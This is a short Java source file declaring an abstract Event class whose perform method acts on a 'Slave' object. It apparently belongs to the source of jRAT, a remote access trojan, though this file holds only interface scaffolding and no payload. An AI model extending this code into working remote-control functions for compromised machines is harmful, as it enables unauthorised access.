package pro.jrat.events;

import pro.jrat.Slave;

public abstract class Event {

	public String name;

	public Event(String name) {
		this.name = name;
	}

	public abstract Object[] getDisplayData();

	public abstract void perform(Slave sl);

	public abstract String toString();

	public abstract boolean add();

	public abstract String getIcon();
}
